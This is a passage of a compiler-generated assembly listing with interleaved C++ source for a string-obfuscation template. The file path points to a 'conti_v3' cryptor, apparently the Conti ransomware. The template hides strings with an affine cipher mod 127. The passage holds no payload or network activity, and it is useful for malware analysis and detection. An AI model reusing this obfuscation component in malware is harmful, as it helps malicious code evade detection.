  0022d	0f b6 40 01	 movzx	 eax, BYTE PTR [rax+1]
  00231	88 85 c0 00 00
	00		 mov	 BYTE PTR tv182[rbp], al

; 52   :     {
; 53   : 
; 54   :     }

  00237	48 8b 85 f0 00
	00 00		 mov	 rax, QWORD PTR this$[rbp]
  0023e	48 8d a5 d8 00
	00 00		 lea	 rsp, QWORD PTR [rbp+216]
  00245	5f		 pop	 rdi
  00246	5d		 pop	 rbp
  00247	c3		 ret	 0
??0?$MetaBuffer@$0GL@$0FC@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08$09$0L@@std@@@@QEAA@PEBE@Z ENDP ; MetaBuffer<107,82,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9,10,11> >::MetaBuffer<107,82,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9,10,11> >
_TEXT	ENDS
; Function compile flags: /Odtp /RTCsu /ZI
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\obfuscation\MetaString.h
;	COMDAT ?decrypt@?$MetaBuffer@$0BP@$0CN@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08$09$0L@@std@@@@AEBAEE@Z
_TEXT	SEGMENT
this$ = 224
byte$ = 232
?decrypt@?$MetaBuffer@$0BP@$0CN@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08$09$0L@@std@@@@AEBAEE@Z PROC ; MetaBuffer<31,45,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9,10,11> >::decrypt, COMDAT

; 79   :     {

$LN3:
  00000	88 54 24 10	 mov	 BYTE PTR [rsp+16], dl
  00004	48 89 4c 24 08	 mov	 QWORD PTR [rsp+8], rcx
  00009	55		 push	 rbp
  0000a	57		 push	 rdi
  0000b	48 81 ec e8 00
	00 00		 sub	 rsp, 232		; 000000e8H
  00012	48 8d 6c 24 20	 lea	 rbp, QWORD PTR [rsp+32]
  00017	48 8d 0d 00 00
	00 00		 lea	 rcx, OFFSET FLAT:__722C6D77_MetaString@h
  0001e	e8 00 00 00 00	 call	 __CheckForDebuggerJustMyCode

; 80   :         return positive_modulo(ExtendedEuclidian<127, A>::y * (byte - B), 127);

  00023	0f b6 85 e8 00
	00 00		 movzx	 eax, BYTE PTR byte$[rbp]
  0002a	83 e8 2d	 sub	 eax, 45			; 0000002dH
  0002d	6b c0 29	 imul	 eax, eax, 41		; 00000029H
  00030	ba 7f 00 00 00	 mov	 edx, 127		; 0000007fH
  00035	8b c8		 mov	 ecx, eax
  00037	e8 00 00 00 00	 call	 ?positive_modulo@@YAHHH@Z ; positive_modulo

; 81   :     }

  0003c	48 8d a5 c8 00
	00 00		 lea	 rsp, QWORD PTR [rbp+200]
  00043	5f		 pop	 rdi
  00044	5d		 pop	 rbp
  00045	c3		 ret	 0
?decrypt@?$MetaBuffer@$0BP@$0CN@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08$09$0L@@std@@@@AEBAEE@Z ENDP ; MetaBuffer<31,45,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9,10,11> >::decrypt
_TEXT	ENDS
; Function compile flags: /Odtp /RTCsu /ZI
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\obfuscation\MetaString.h
;	COMDAT ?encrypt@?$MetaBuffer@$0BP@$0CN@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08$09$0L@@std@@@@AEBAEE@Z
_TEXT	SEGMENT
this$ = 224
byte$ = 232
?encrypt@?$MetaBuffer@$0BP@$0CN@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08$09$0L@@std@@@@AEBAEE@Z PROC ; MetaBuffer<31,45,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9,10,11> >::encrypt, COMDAT

; 74   :     {

$LN3:
  00000	88 54 24 10	 mov	 BYTE PTR [rsp+16], dl
  00004	48 89 4c 24 08	 mov	 QWORD PTR [rsp+8], rcx
  00009	55		 push	 rbp
  0000a	57		 push	 rdi
  0000b	48 81 ec e8 00
	00 00		 sub	 rsp, 232		; 000000e8H
  00012	48 8d 6c 24 20	 lea	 rbp, QWORD PTR [rsp+32]
  00017	48 8d 0d 00 00
	00 00		 lea	 rcx, OFFSET FLAT:__722C6D77_MetaString@h
  0001e	e8 00 00 00 00	 call	 __CheckForDebuggerJustMyCode

; 75   :         return (A * byte + B) % 127;

  00023	0f b6 85 e8 00
	00 00		 movzx	 eax, BYTE PTR byte$[rbp]
  0002a	6b c0 1f	 imul	 eax, eax, 31
  0002d	83 c0 2d	 add	 eax, 45			; 0000002dH
  00030	99		 cdq
  00031	b9 7f 00 00 00	 mov	 ecx, 127		; 0000007fH
  00036	f7 f9		 idiv	 ecx
  00038	8b c2		 mov	 eax, edx

; 76   :     }

  0003a	48 8d a5 c8 00
	00 00		 lea	 rsp, QWORD PTR [rbp+200]
  00041	5f		 pop	 rdi
  00042	5d		 pop	 rbp
  00043	c3		 ret	 0
?encrypt@?$MetaBuffer@$0BP@$0CN@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08$09$0L@@std@@@@AEBAEE@Z ENDP ; MetaBuffer<31,45,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9,10,11> >::encrypt
_TEXT	ENDS
; Function compile flags: /Odtp /RTCsu /ZI
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\obfuscation\MetaString.h
;	COMDAT ?decrypt@?$MetaBuffer@$0BP@$0CN@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08$09$0L@@std@@@@QEAAPEBDXZ
_TEXT	SEGMENT
i$1 = 8
this$ = 256
?decrypt@?$MetaBuffer@$0BP@$0CN@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08$09$0L@@std@@@@QEAAPEBDXZ PROC ; MetaBuffer<31,45,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9,10,11> >::decrypt, COMDAT

; 62   :     {

$LN7:
  00000	48 89 4c 24 08	 mov	 QWORD PTR [rsp+8], rcx
  00005	55		 push	 rbp
  00006	57		 push	 rdi
  00007	48 81 ec 08 01
	00 00		 sub	 rsp, 264		; 00000108H
  0000e	48 8d 6c 24 20	 lea	 rbp, QWORD PTR [rsp+32]
  00013	48 8d 0d 00 00
	00 00		 lea	 rcx, OFFSET FLAT:__722C6D77_MetaString@h
  0001a	e8 00 00 00 00	 call	 __CheckForDebuggerJustMyCode

; 63   :         if (!isDecrypted())

  0001f	48 8b 8d 00 01
	00 00		 mov	 rcx, QWORD PTR this$[rbp]
  00026	e8 00 00 00 00	 call	 ?isDecrypted@?$MetaBuffer@$0BP@$0CN@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08$09$0L@@std@@@@QEBA_NXZ ; MetaBuffer<31,45,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9,10,11> >::isDecrypted
  0002b	0f b6 c0	 movzx	 eax, al
  0002e	85 c0		 test	 eax, eax
  00030	75 53		 jne	 SHORT $LN5@decrypt

; 64   :         {
; 65   :             for (size_t i = 0; i < sizeof...(Ints); ++i)

  00032	48 c7 45 08 00
	00 00 00	 mov	 QWORD PTR i$1[rbp], 0
  0003a	eb 0b		 jmp	 SHORT $LN4@decrypt
$LN2@decrypt:
  0003c	48 8b 45 08	 mov	 rax, QWORD PTR i$1[rbp]
  00040	48 ff c0	 inc	 rax
  00043	48 89 45 08	 mov	 QWORD PTR i$1[rbp], rax
$LN4@decrypt:
  00047	48 83 7d 08 0c	 cmp	 QWORD PTR i$1[rbp], 12
  0004c	73 37		 jae	 SHORT $LN3@decrypt

; 66   :                 m_buffer[i] = decrypt(m_buffer[i]);

  0004e	48 8b 45 08	 mov	 rax, QWORD PTR i$1[rbp]
  00052	48 8b 8d 00 01
	00 00		 mov	 rcx, QWORD PTR this$[rbp]
  00059	48 03 c8	 add	 rcx, rax
  0005c	48 8b c1	 mov	 rax, rcx
  0005f	0f b6 50 01	 movzx	 edx, BYTE PTR [rax+1]
  00063	48 8b 8d 00 01
	00 00		 mov	 rcx, QWORD PTR this$[rbp]
  0006a	e8 00 00 00 00	 call	 ?decrypt@?$MetaBuffer@$0BP@$0CN@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08$09$0L@@std@@@@AEBAEE@Z ; MetaBuffer<31,45,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9,10,11> >::decrypt
  0006f	48 8b 4d 08	 mov	 rcx, QWORD PTR i$1[rbp]
  00073	48 8b 95 00 01
	00 00		 mov	 rdx, QWORD PTR this$[rbp]
  0007a	48 03 d1	 add	 rdx, rcx
  0007d	48 8b ca	 mov	 rcx, rdx
  00080	88 41 01	 mov	 BYTE PTR [rcx+1], al
  00083	eb b7		 jmp	 SHORT $LN2@decrypt
$LN3@decrypt:
$LN5@decrypt:

; 67   :         }
; 68   : 
; 69   :         return (const char*)m_buffer;

  00085	48 8b 85 00 01
	00 00		 mov	 rax, QWORD PTR this$[rbp]
  0008c	48 ff c0	 inc	 rax

; 70   :     }

  0008f	48 8d a5 e8 00
	00 00		 lea	 rsp, QWORD PTR [rbp+232]
  00096	5f		 pop	 rdi
  00097	5d		 pop	 rbp
  00098	c3		 ret	 0
?decrypt@?$MetaBuffer@$0BP@$0CN@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08$09$0L@@std@@@@QEAAPEBDXZ ENDP ; MetaBuffer<31,45,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9,10,11> >::decrypt
_TEXT	ENDS
; Function compile flags: /Odtp /RTCsu /ZI
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\obfuscation\MetaString.h
;	COMDAT ?isDecrypted@?$MetaBuffer@$0BP@$0CN@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08$09$0L@@std@@@@QEBA_NXZ
_TEXT	SEGMENT
this$ = 224
?isDecrypted@?$MetaBuffer@$0BP@$0CN@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08$09$0L@@std@@@@QEBA_NXZ PROC ; MetaBuffer<31,45,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9,10,11> >::isDecrypted, COMDAT

; 57   :     {

$LN3:
  00000	48 89 4c 24 08	 mov	 QWORD PTR [rsp+8], rcx
  00005	55		 push	 rbp
  00006	57		 push	 rdi
  00007	48 81 ec e8 00
	00 00		 sub	 rsp, 232		; 000000e8H
  0000e	48 8d 6c 24 20	 lea	 rbp, QWORD PTR [rsp+32]
  00013	48 8d 0d 00 00
	00 00		 lea	 rcx, OFFSET FLAT:__722C6D77_MetaString@h
  0001a	e8 00 00 00 00	 call	 __CheckForDebuggerJustMyCode

; 58   :         return m_isDecrypted;

  0001f	48 8b 85 e0 00
	00 00		 mov	 rax, QWORD PTR this$[rbp]
  00026	0f b6 00	 movzx	 eax, BYTE PTR [rax]

; 59   :     }

  00029	48 8d a5 c8 00
	00 00		 lea	 rsp, QWORD PTR [rbp+200]
  00030	5f		 pop	 rdi
  00031	5d		 pop	 rbp
  00032	c3		 ret	 0
?isDecrypted@?$MetaBuffer@$0BP@$0CN@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08$09$0L@@std@@@@QEBA_NXZ ENDP ; MetaBuffer<31,45,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9,10,11> >::isDecrypted
_TEXT	ENDS
; Function compile flags: /Odtp /RTCsu /ZI
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\obfuscation\MetaString.h
;	COMDAT ??0?$MetaBuffer@$0BP@$0CN@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08$09$0L@@std@@@@QEAA@PEBE@Z
_TEXT	SEGMENT
tv182 = 192
this$ = 240
data$ = 248
??0?$MetaBuffer@$0BP@$0CN@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08$09$0L@@std@@@@QEAA@PEBE@Z PROC ; MetaBuffer<31,45,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9,10,11> >::MetaBuffer<31,45,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9,10,11> >, COMDAT

; 50   :     constexpr __forceinline MetaBuffer(const unsigned char* data)

$LN3:
  00000	48 89 54 24 10	 mov	 QWORD PTR [rsp+16], rdx
  00005	48 89 4c 24 08	 mov	 QWORD PTR [rsp+8], rcx
  0000a	55		 push	 rbp
  0000b	57		 push	 rdi
  0000c	48 81 ec f8 00
	00 00		 sub	 rsp, 248		; 000000f8H
  00013	48 8d 6c 24 20	 lea	 rbp, QWORD PTR [rsp+32]
  00018	48 8d 0d 00 00
	00 00		 lea	 rcx, OFFSET FLAT:__722C6D77_MetaString@h
  0001f	e8 00 00 00 00	 call	 __CheckForDebuggerJustMyCode

; 55   : 
; 56   :     inline bool isDecrypted() const
; 57   :     {
; 58   :         return m_isDecrypted;
; 59   :     }
; 60   : 
; 61   :     inline const char* decrypt()
; 62   :     {
; 63   :         if (!isDecrypted())
; 64   :         {
; 65   :             for (size_t i = 0; i < sizeof...(Ints); ++i)
; 66   :                 m_buffer[i] = decrypt(m_buffer[i]);
; 67   :         }
; 68   : 
; 69   :         return (const char*)m_buffer;
; 70   :     }
; 71   : 
; 72   : private:
; 73   :     constexpr unsigned char __forceinline encrypt(unsigned char byte) const
; 74   :     {
; 75   :         return (A * byte + B) % 127;
; 76   :     }
; 77   : 
; 78   :     constexpr unsigned char __forceinline decrypt(unsigned char byte) const
; 79   :     {
; 80   :         return positive_modulo(ExtendedEuclidian<127, A>::y * (byte - B), 127);
; 81   :     }
; 82   : 
; 83   :     volatile bool m_isDecrypted = false;

  00024	48 8b 85 f0 00
	00 00		 mov	 rax, QWORD PTR this$[rbp]
  0002b	c6 00 00	 mov	 BYTE PTR [rax], 0

; 51   :         : m_buffer{ encrypt(data[Ints])... }

  0002e	b8 01 00 00 00	 mov	 eax, 1
  00033	48 6b c0 00	 imul	 rax, rax, 0
  00037	48 8b 8d f8 00
	00 00		 mov	 rcx, QWORD PTR data$[rbp]
  0003e	0f b6 14 01	 movzx	 edx, BYTE PTR [rcx+rax]
  00042	48 8b 8d f0 00
	00 00		 mov	 rcx, QWORD PTR this$[rbp]
  00049	e8 00 00 00 00	 call	 ?encrypt@?$MetaBuffer@$0BP@$0CN@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08$09$0L@@std@@@@AEBAEE@Z ; MetaBuffer<31,45,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9,10,11> >::encrypt
  0004e	48 8b 8d f0 00
	00 00		 mov	 rcx, QWORD PTR this$[rbp]
  00055	88 41 01	 mov	 BYTE PTR [rcx+1], al
  00058	b8 01 00 00 00	 mov	 eax, 1
  0005d	48 6b c0 01	 imul	 rax, rax, 1
  00061	48 8b 8d f8 00
	00 00		 mov	 rcx, QWORD PTR data$[rbp]
  00068	0f b6 14 01	 movzx	 edx, BYTE PTR [rcx+rax]
  0006c	48 8b 8d f0 00
	00 00		 mov	 rcx, QWORD PTR this$[rbp]
  00073	e8 00 00 00 00	 call	 ?encrypt@?$MetaBuffer@$0BP@$0CN@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08$09$0L@@std@@@@AEBAEE@Z ; MetaBuffer<31,45,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9,10,11> >::encrypt
  00078	48 8b 8d f0 00
	00 00		 mov	 rcx, QWORD PTR this$[rbp]
  0007f	88 41 02	 mov	 BYTE PTR [rcx+2], al
  00082	b8 01 00 00 00	 mov	 eax, 1
  00087	48 6b c0 02	 imul	 rax, rax, 2
  0008b	48 8b 8d f8 00
	00 00		 mov	 rcx, QWORD PTR data$[rbp]
  00092	0f b6 14 01	 movzx	 edx, BYTE PTR [rcx+rax]
  00096	48 8b 8d f0 00
	00 00		 mov	 rcx, QWORD PTR this$[rbp]
  0009d	e8 00 00 00 00	 call	 ?encrypt@?$MetaBuffer@$0BP@$0CN@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08$09$0L@@std@@@@AEBAEE@Z ; MetaBuffer<31,45,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9,10,11> >::encrypt
  000a2	48 8b 8d f0 00
	00 00		 mov	 rcx, QWORD PTR this$[rbp]
  000a9	88 41 03	 mov	 BYTE PTR [rcx+3], al
  000ac	b8 01 00 00 00	 mov	 eax, 1
  000b1	48 6b c0 03	 imul	 rax, rax, 3
  000b5	48 8b 8d f8 00
	00 00		 mov	 rcx, QWORD PTR data$[rbp]
  000bc	0f b6 14 01	 movzx	 edx, BYTE PTR [rcx+rax]
  000c0	48 8b 8d f0 00
	00 00		 mov	 rcx, QWORD PTR this$[rbp]
  000c7	e8 00 00 00 00	 call	 ?encrypt@?$MetaBuffer@$0BP@$0CN@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08$09$0L@@std@@@@AEBAEE@Z ; MetaBuffer<31,45,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9,10,11> >::encrypt
  000cc	48 8b 8d f0 00
	00 00		 mov	 rcx, QWORD PTR this$[rbp]
  000d3	88 41 04	 mov	 BYTE PTR [rcx+4], al
  000d6	b8 01 00 00 00	 mov	 eax, 1
  000db	48 6b c0 04	 imul	 rax, rax, 4
  000df	48 8b 8d f8 00
	00 00		 mov	 rcx, QWORD PTR data$[rbp]
  000e6	0f b6 14 01	 movzx	 edx, BYTE PTR [rcx+rax]
  000ea	48 8b 8d f0 00
	00 00		 mov	 rcx, QWORD PTR this$[rbp]
  000f1	e8 00 00 00 00	 call	 ?encrypt@?$MetaBuffer@$0BP@$0CN@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08$09$0L@@std@@@@AEBAEE@Z ; MetaBuffer<31,45,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9,10,11> >::encrypt
  000f6	48 8b 8d f0 00
	00 00		 mov	 rcx, QWORD PTR this$[rbp]
  000fd	88 41 05	 mov	 BYTE PTR [rcx+5], al
  00100	b8 01 00 00 00	 mov	 eax, 1
  00105	48 6b c0 05	 imul	 rax, rax, 5
  00109	48 8b 8d f8 00
	00 00		 mov	 rcx, QWORD PTR data$[rbp]
  00110	0f b6 14 01	 movzx	 edx, BYTE PTR [rcx+rax]
  00114	48 8b 8d f0 00
	00 00		 mov	 rcx, QWORD PTR this$[rbp]
  0011b	e8 00 00 00 00	 call	 ?encrypt@?$MetaBuffer@$0BP@$0CN@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08$09$0L@@std@@@@AEBAEE@Z ; MetaBuffer<31,45,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9,10,11> >::encrypt
  00120	48 8b 8d f0 00
	00 00		 mov	 rcx, QWORD PTR this$[rbp]
  00127	88 41 06	 mov	 BYTE PTR [rcx+6], al
  0012a	b8 01 00 00 00	 mov	 eax, 1
  0012f	48 6b c0 06	 imul	 rax, rax, 6
  00133	48 8b 8d f8 00
	00 00		 mov	 rcx, QWORD PTR data$[rbp]
  0013a	0f b6 14 01	 movzx	 edx, BYTE PTR [rcx+rax]
  0013e	48 8b 8d f0 00
	00 00		 mov	 rcx, QWORD PTR this$[rbp]
  00145	e8 00 00 00 00	 call	 ?encrypt@?$MetaBuffer@$0BP@$0CN@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08$09$0L@@std@@@@AEBAEE@Z ; MetaBuffer<31,45,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9,10,11> >::encrypt
  0014a	48 8b 8d f0 00
	00 00		 mov	 rcx, QWORD PTR this$[rbp]
  00151	88 41 07	 mov	 BYTE PTR [rcx+7], al
  00154	b8 01 00 00 00	 mov	 eax, 1
  00159	48 6b c0 07	 imul	 rax, rax, 7
  0015d	48 8b 8d f8 00
	00 00		 mov	 rcx, QWORD PTR data$[rbp]
  00164	0f b6 14 01	 movzx	 edx, BYTE PTR [rcx+rax]
  00168	48 8b 8d f0 00
	00 00		 mov	 rcx, QWORD PTR this$[rbp]
  0016f	e8 00 00 00 00	 call	 ?encrypt@?$MetaBuffer@$0BP@$0CN@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08$09$0L@@std@@@@AEBAEE@Z ; MetaBuffer<31,45,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9,10,11> >::encrypt
  00174	48 8b 8d f0 00
	00 00		 mov	 rcx, QWORD PTR this$[rbp]
  0017b	88 41 08	 mov	 BYTE PTR [rcx+8], al
  0017e	b8 01 00 00 00	 mov	 eax, 1
  00183	48 6b c0 08	 imul	 rax, rax, 8
  00187	48 8b 8d f8 00
	00 00		 mov	 rcx, QWORD PTR data$[rbp]
  0018e	0f b6 14 01	 movzx	 edx, BYTE PTR [rcx+rax]
  00192	48 8b 8d f0 00
	00 00		 mov	 rcx, QWORD PTR this$[rbp]
  00199	e8 00 00 00 00	 call	 ?encrypt@?$MetaBuffer@$0BP@$0CN@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08$09$0L@@std@@@@AEBAEE@Z ; MetaBuffer<31,45,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9,10,11> >::encrypt
  0019e	48 8b 8d f0 00
	00 00		 mov	 rcx, QWORD PTR this$[rbp]
  001a5	88 41 09	 mov	 BYTE PTR [rcx+9], al
  001a8	b8 01 00 00 00	 mov	 eax, 1
  001ad	48 6b c0 09	 imul	 rax, rax, 9
  001b1	48 8b 8d f8 00
	00 00		 mov	 rcx, QWORD PTR data$[rbp]
  001b8	0f b6 14 01	 movzx	 edx, BYTE PTR [rcx+rax]
  001bc	48 8b 8d f0 00
	00 00		 mov	 rcx, QWORD PTR this$[rbp]
  001c3	e8 00 00 00 00	 call	 ?encrypt@?$MetaBuffer@$0BP@$0CN@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08$09$0L@@std@@@@AEBAEE@Z ; MetaBuffer<31,45,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9,10,11> >::encrypt
  001c8	48 8b 8d f0 00
	00 00		 mov	 rcx, QWORD PTR this$[rbp]
  001cf	88 41 0a	 mov	 BYTE PTR [rcx+10], al
  001d2	b8 01 00 00 00	 mov	 eax, 1
  001d7	48 6b c0 0a	 imul	 rax, rax, 10
  001db	48 8b 8d f8 00
	00 00		 mov	 rcx, QWORD PTR data$[rbp]
  001e2	0f b6 14 01	 movzx	 edx, BYTE PTR [rcx+rax]
  001e6	48 8b 8d f0 00
	00 00		 mov	 rcx, QWORD PTR this$[rbp]
  001ed	e8 00 00 00 00	 call	 ?encrypt@?$MetaBuffer@$0BP@$0CN@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08$09$0L@@std@@@@AEBAEE@Z ; MetaBuffer<31,45,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9,10,11> >::encrypt
  001f2	48 8b 8d f0 00
	00 00		 mov	 rcx, QWORD PTR this$[rbp]
  001f9	88 41 0b	 mov	 BYTE PTR [rcx+11], al
  001fc	b8 01 00 00 00	 mov	 eax, 1
  00201	48 6b c0 0b	 imul	 rax, rax, 11
  00205	48 8b 8d f8 00
	00 00		 mov	 rcx, QWORD PTR data$[rbp]
  0020c	0f b6 14 01	 movzx	 edx, BYTE PTR [rcx+rax]
  00210	48 8b 8d f0 00
	00 00		 mov	 rcx, QWORD PTR this$[rbp]
  00217	e8 00 00 00 00	 call	 ?encrypt@?$MetaBuffer@$0BP@$0CN@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08$09$0L@@std@@@@AEBAEE@Z ; MetaBuffer<31,45,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9,10,11> >::encrypt
  0021c	48 8b 8d f0 00
	00 00		 mov	 rcx, QWORD PTR this$[rbp]
  00223	88 41 0c	 mov	 BYTE PTR [rcx+12], al
  00226	48 8b 85 f0 00
	00 00		 mov	 rax, QWORD PTR this$[rbp]
  0022d	0f b6 40 01	 movzx	 eax, BYTE PTR [rax+1]
  00231	88 85 c0 00 00
	00		 mov	 BYTE PTR tv182[rbp], al

; 52   :     {
; 53   : 
; 54   :     }

  00237	48 8b 85 f0 00
	00 00		 mov	 rax, QWORD PTR this$[rbp]
  0023e	48 8d a5 d8 00
	00 00		 lea	 rsp, QWORD PTR [rbp+216]
  00245	5f		 pop	 rdi
  00246	5d		 pop	 rbp
  00247	c3		 ret	 0
??0?$MetaBuffer@$0BP@$0CN@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08$09$0L@@std@@@@QEAA@PEBE@Z ENDP ; MetaBuffer<31,45,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9,10,11> >::MetaBuffer<31,45,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9,10,11> >
_TEXT	ENDS
; Function compile flags: /Odtp /RTCsu /ZI
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\obfuscation\MetaString.h
;	COMDAT ?decrypt@?$MetaBuffer@$0EP@$0CE@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08$09@std@@@@AEBAEE@Z
_TEXT	SEGMENT
this$ = 224
byte$ = 232
?decrypt@?$MetaBuffer@$0EP@$0CE@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08$09@std@@@@AEBAEE@Z PROC ; MetaBuffer<79,36,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9,10> >::decrypt, COMDAT

; 79   :     {

$LN3:
  00000	88 54 24 10	 mov	 BYTE PTR [rsp+16], dl
  00004	48 89 4c 24 08	 mov	 QWORD PTR [rsp+8], rcx
  00009	55		 push	 rbp
  0000a	57		 push	 rdi
  0000b	48 81 ec e8 00
	00 00		 sub	 rsp, 232		; 000000e8H
  00012	48 8d 6c 24 20	 lea	 rbp, QWORD PTR [rsp+32]
  00017	48 8d 0d 00 00
	00 00		 lea	 rcx, OFFSET FLAT:__722C6D77_MetaString@h
  0001e	e8 00 00 00 00	 call	 __CheckForDebuggerJustMyCode

; 80   :         return positive_modulo(ExtendedEuclidian<127, A>::y * (byte - B), 127);

  00023	0f b6 85 e8 00
	00 00		 movzx	 eax, BYTE PTR byte$[rbp]
  0002a	83 e8 24	 sub	 eax, 36			; 00000024H
  0002d	6b c0 d3	 imul	 eax, eax, -45		; ffffffffffffffd3H
  00030	ba 7f 00 00 00	 mov	 edx, 127		; 0000007fH
  00035	8b c8		 mov	 ecx, eax
  00037	e8 00 00 00 00	 call	 ?positive_modulo@@YAHHH@Z ; positive_modulo

; 81   :     }

  0003c	48 8d a5 c8 00
	00 00		 lea	 rsp, QWORD PTR [rbp+200]
  00043	5f		 pop	 rdi
  00044	5d		 pop	 rbp
  00045	c3		 ret	 0
?decrypt@?$MetaBuffer@$0EP@$0CE@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08$09@std@@@@AEBAEE@Z ENDP ; MetaBuffer<79,36,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9,10> >::decrypt
_TEXT	ENDS
; Function compile flags: /Odtp /RTCsu /ZI
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\obfuscation\MetaString.h
;	COMDAT ?encrypt@?$MetaBuffer@$0EP@$0CE@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08$09@std@@@@AEBAEE@Z
_TEXT	SEGMENT
this$ = 224
byte$ = 232
?encrypt@?$MetaBuffer@$0EP@$0CE@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08$09@std@@@@AEBAEE@Z PROC ; MetaBuffer<79,36,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9,10> >::encrypt, COMDAT

; 74   :     {

$LN3:
  00000	88 54 24 10	 mov	 BYTE PTR [rsp+16], dl
  00004	48 89 4c 24 08	 mov	 QWORD PTR [rsp+8], rcx
  00009	55		 push	 rbp
  0000a	57		 push	 rdi
  0000b	48 81 ec e8 00
	00 00		 sub	 rsp, 232		; 000000e8H
  00012	48 8d 6c 24 20	 lea	 rbp, QWORD PTR [rsp+32]
  00017	48 8d 0d 00 00
	00 00		 lea	 rcx, OFFSET FLAT:__722C6D77_MetaString@h
  0001e	e8 00 00 00 00	 call	 __CheckForDebuggerJustMyCode

; 75   :         return (A * byte + B) % 127;

  00023	0f b6 85 e8 00
	00 00		 movzx	 eax, BYTE PTR byte$[rbp]
  0002a	6b c0 4f	 imul	 eax, eax, 79		; 0000004fH
  0002d	83 c0 24	 add	 eax, 36			; 00000024H
  00030	99		 cdq
  00031	b9 7f 00 00 00	 mov	 ecx, 127		; 0000007fH
  00036	f7 f9		 idiv	 ecx
  00038	8b c2		 mov	 eax, edx

; 76   :     }

  0003a	48 8d a5 c8 00
	00 00		 lea	 rsp, QWORD PTR [rbp+200]
  00041	5f		 pop	 rdi
  00042	5d		 pop	 rbp
  00043	c3		 ret	 0
?encrypt@?$MetaBuffer@$0EP@$0CE@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08$09@std@@@@AEBAEE@Z ENDP ; MetaBuffer<79,36,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9,10> >::encrypt
_TEXT	ENDS
; Function compile flags: /Odtp /RTCsu /ZI
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\obfuscation\MetaString.h
;	COMDAT ?decrypt@?$MetaBuffer@$0EP@$0CE@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08$09@std@@@@QEAAPEBDXZ
_TEXT	SEGMENT
